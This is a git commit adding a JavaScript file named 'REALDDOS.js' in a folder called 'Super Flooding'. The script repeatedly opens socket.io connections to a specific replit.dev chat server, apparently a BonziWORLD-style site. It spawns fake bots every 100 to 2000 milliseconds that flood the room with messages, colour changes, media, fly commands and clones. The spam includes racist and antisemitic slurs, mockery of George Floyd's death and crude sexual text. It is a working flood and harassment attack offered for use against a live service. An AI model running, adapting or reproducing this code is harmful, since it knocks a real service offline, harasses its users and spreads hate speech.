c197fab02b987f11e478a122533163b733699001
Windows Xp Sky <reinilsonfernandes25@outlook.com>
2026-05-23 14:27:15 -0300

    Create REALDDOS.js

---
+++ Super Flooding/REALDDOS.js
@@ -0,0 +1,94 @@
+setInterval(function(){var Doe = io('https://69b7fca0-f6e5-4f18-b807-d49e97c2143f-00-33y5zxs1ttoo1.riker.replit.dev:3000/');
+Doe.emit('login',{name:'Chuchel DDOS Bot'});
+Doe.emit('talk',{text:'THIS WEBSITE HAS BEEN FLOODED BY CHUCHEL DDOS BOT'})},2000);
+setInterval(function(){var Doe = io('https://69b7fca0-f6e5-4f18-b807-d49e97c2143f-00-33y5zxs1ttoo1.riker.replit.dev:3000/');
+Doe.emit('login',{name:'behh'});
+Doe.emit('talk',{text:'behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh Behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh Behh behh behh behh behh behh behh behh behh behh behh Behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh behh Behh behh behh behh behh behh behh behh behh behh behh'})},2000);
+setInterval(function(){var Doe = io('https://69b7fca0-f6e5-4f18-b807-d49e97c2143f-00-33y5zxs1ttoo1.riker.replit.dev:3000/');
+Doe.emit('login',{name:'WEBSIM FLOODBOT'});
+Doe.emit('talk',{text:'THIS WEBSITE HAS BEEN FLOODED BY WEBSIM FLOODBOT'})},2000);
+setInterval(function(){var Doe = io('https://69b7fca0-f6e5-4f18-b807-d49e97c2143f-00-33y5zxs1ttoo1.riker.replit.dev:3000/');
+Doe.emit('login',{name:'ME JEW'});
+Doe.emit('talk',{text:'ME JEWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW'})},2000);
+setInterval(function(){var Doe = io('https://69b7fca0-f6e5-4f18-b807-d49e97c2143f-00-33y5zxs1ttoo1.riker.replit.dev:3000/');
+Doe.emit('login',{name:'George Floyd'});
+Doe.emit('talk',{text:'I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE! I CANT BREATHE!'})},2000);
+setInterval(function(){var Doe = io('https://69b7fca0-f6e5-4f18-b807-d49e97c2143f-00-33y5zxs1ttoo1.riker.replit.dev:3000/');
+Doe.emit('login',{name:'I NATE HIGGERS'});
+Doe.emit('talk',{text:'I NATE HIGGERS'})},2000);
+setInterval(function(){var Doe = io('https://69b7fca0-f6e5-4f18-b807-d49e97c2143f-00-33y5zxs1ttoo1.riker.replit.dev:3000/');
+Doe.emit('login',{name:'https://69b7fca0-f6e5-4f18-b807-d49e97c2143f-00-33y5zxs1ttoo1.riker.replit.dev:3000/ GOT FLOODED BY DARWIN NEWSON'});
+Doe.emit('talk',{text:'https://69b7fca0-f6e5-4f18-b807-d49e97c2143f-00-33y5zxs1ttoo1.riker.replit.dev:3000/ GOT FLOODED BY DARWIN NEWSON'})},2000);
+setInterval(function(){var Doe = io('https://69b7fca0-f6e5-4f18-b807-d49e97c2143f-00-33y5zxs1ttoo1.riker.replit.dev:3000/');
+Doe.emit('login',{name:' FLOODED BY DARWIN NEWSON'});
+Doe.emit('talk',{text:'FLOODED BY DARWIN NEWSON'})},2000);
+setInterval(function(){var Doe = io('https://69b7fca0-f6e5-4f18-b807-d49e97c2143f-00-33y5zxs1ttoo1.riker.replit.dev:3000/');
+Doe.emit('login',{name:'HTTP ERROR 503'});
+Doe.emit('talk',{text:'HTTP ERROR 503'})},2000);
+setInterval(function(){var Doe = io('https://69b7fca0-f6e5-4f18-b807-d49e97c2143f-00-33y5zxs1ttoo1.riker.replit.dev:3000/');
+Doe.emit('login',{name:'BONZI.GAY'});
+Doe.emit('talk',{text:'BONZI.GAY IS BETTER THAN THIS WEBSITE!'})},2000);
+JavaScript:setInterval(function(){var sockets = []; var G = io("https://69b7fca0-f6e5-4f18-b807-d49e97c2143f-00-33y5zxs1ttoo1.riker.replit.dev:3000/"); sockets.push(G);G.emit('login',{name:'BOOBA SCREAM'}); G.emit("command", {list: ["color", "white"]}); G.emit("command", {list: ["color", "white"]}); G.emit("command", {list: ["video","https://files.catbox.moe/s02zhb.mp4"]})} ,100);JavaScript:setInterval(function(){var sockets = []; var G = io("https://69b7fca0-f6e5-4f18-b807-d49e97c2143f-00-33y5zxs1ttoo1.riker.replit.dev:3000/"); sockets.push(G);G.emit('login',{name:'Animal Sounds'}); G.emit("command", {list: ["color", ""]}); G.emit("command", {list: ["color", ""]}); G.emit("command", {list: ["video","https://files.catbox.moe/3jcik0.wav"]})} ,1000);JavaScript:setInterval(function(){var sockets = []; var G = io("https://69b7fca0-f6e5-4f18-b807-d49e97c2143f-00-33y5zxs1ttoo1.riker.replit.dev:3000/"); sockets.push(G);G.emit('login',{name:'Lindsay'}); G.emit("command", {list: ["color", "red"]}); G.emit("command", {list: ["color", "red"]}); G.emit("command", {list: ["img","https://files.catbox.moe/tmgp7x.png"]})} ,100);JavaScript:setInterval(function(){var sockets = []; var G = io("https://69b7fca0-f6e5-4f18-b807-d49e97c2143f-00-33y5zxs1ttoo1.riker.replit.dev:3000/"); sockets.push(G);G.emit('login',{name:'Izzy'}); G.emit("command", {list: ["color", "green"]}); G.emit("command", {list: ["color", "green"]}); G.emit("command", {list: ["img","https://files.catbox.moe/hbhofm.png"]})} ,100);JavaScript:setInterval(function(){var sockets = []; var G = io("https://69b7fca0-f6e5-4f18-b807-d49e97c2143f-00-33y5zxs1ttoo1.riker.replit.dev:3000/"); sockets.push(G);G.emit('login',{name:'Gwen'}); G.emit("command", {list: ["color", "blue"]}); G.emit("command", {list: ["color", "blue"]}); G.emit("command", {list: ["img","https://files.catbox.moe/zythrw.png"]})} ,100);JavaScript:setInterval(function(){var sockets = []; var G = io("https://69b7fca0-f6e5-4f18-b807-d49e97c2143f-00-33y5zxs1ttoo1.riker.replit.dev:3000/"); sockets.push(G);G.emit('login',{name:'Ella'}); G.emit("command", {list: ["color", "pink"]}); G.emit("command", {list: ["color", "pink"]}); G.emit("command", {list: ["img","https://files.catbox.moe/4ehr3h.png"]})} ,100);
+
+setInterval(function () {
+  var G = io("https://69b7fca0-f6e5-4f18-b807-d49e97c2143f-00-33y5zxs1ttoo1.riker.replit.dev:3000/");
+
+  G.emit("login", { name: "glitch" });
+
+  // COLOR spam interval (per bot)
+  setInterval(function () {
+    G.emit("command", { list: ["color"] });
+  }, 1200); // color spam every 150 ms
+
+  // TALK interval (per bot)
+  setInterval(function () {
+    G.emit("talk", {
+      text: "I AM GLITCHING! WAAAAAAAAAAAAAA!"
+    });
+
+    // fly spam (intentional)
+    setTimeout(function () {
+      G.emit("command", { list: ["fly"] });
+    }, 100);
+
+    setTimeout(function () {
+      G.emit("command", { list: ["dvdbounce"] });
+    }, 800);
+
+    setTimeout(function () {
+      G.emit("command", { list: ["fly"] });
+    }, 100);
+
+    setTimeout(function () {
+      G.emit("command", { list: ["wtf"] });
+    }, 1600);
+
+  }, 1000); // talk every 1000 ms
+
+}, 1800); // bot spawns every 1800 ms
+
+setInterval(function(){var Doe = io('https://69b7fca0-f6e5-4f18-b807-d49e97c2143f-00-33y5zxs1ttoo1.riker.replit.dev:3000/');
+Doe.emit('login',{name:'ks'});
+Doe.emit('talk',{text:'(kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkssssssssssssssssssssssssssssss'})},700);
+setInterval(function(){var Doe = io('https://69b7fca0-f6e5-4f18-b807-d49e97c2143f-00-33y5zxs1ttoo1.riker.replit.dev:3000/');
+Doe.emit('login',{name:'BonziWORLD'});
+Doe.emit('talk',{text:'BonziWORLD revived server NOW HACKED'})},2000);
+JavaScript:setInterval(function(){var sockets = []; var G = io("https://69b7fca0-f6e5-4f18-b807-d49e97c2143f-00-33y5zxs1ttoo1.riker.replit.dev:3000/"); sockets.push(G);G.emit('login',{name:'Poop'}); G.emit("command", {list: ["color", "brown"]}); G.emit("command", {list: ["color", "brown"]}); G.emit("command", {list: ["video","https://www.myinstants.com/media/sounds/nuclear-diarrhea.mp3"]})} ,2000);
+JavaScript:setInterval(function(){var sockets = []; var G = io("https://69b7fca0-f6e5-4f18-b807-d49e97c2143f-00-33y5zxs1ttoo1.riker.replit.dev:3000/"); sockets.push(G);G.emit('login',{name:'Nuke'}); G.emit("command", {list: ["color", "green"]}); G.emit("command", {list: ["color", "green"]}); G.emit("command", {list: ["video","https://www.myinstants.com/media/sounds/nuke-bomb.mp3"]})} ,2000);
+JavaScript:setInterval(function(){var sockets = []; var G = io("https://69b7fca0-f6e5-4f18-b807-d49e97c2143f-00-33y5zxs1ttoo1.riker.replit.dev:3000/"); sockets.push(G);G.emit('login',{name:'Clippit'}); G.emit("command", {list: ["color", "clippy"]}); G.emit("command", {list: ["color", "clippy"]}); G.emit("command", {list: ["owo","Bonziworld Haters"]})} ,100);
+ JavaScript:setInterval(function(){var sockets = []; var G = io("https://69b7fca0-f6e5-4f18-b807-d49e97c2143f-00-33y5zxs1ttoo1.riker.replit.dev:3000/"); sockets.push(G);G.emit('login',{name:'Mr BEE'}); G.emit("command", {list: ["color", "yellow"]}); G.emit("command", {list: ["speed", "11111"]}); G.emit("command", {list: ["bees"]})} ,2000);
+setInterval(() => {
+const bot = io("https://69b7fca0-f6e5-4f18-b807-d49e97c2143f-00-33y5zxs1ttoo1.riker.replit.dev:3000/");
+        bot.emit("client", "MAIN");
+bot.emit("login", {
+        passcode: "",
+        name: "Harold From Total Drama",
+        room: "",
+    })
+setTimeout(() => {
+bot.emit("talk", "boobys");
+},2000)
+setTimeout(()=>{
+            bot.clone();
+        }, 200);
+    },300)
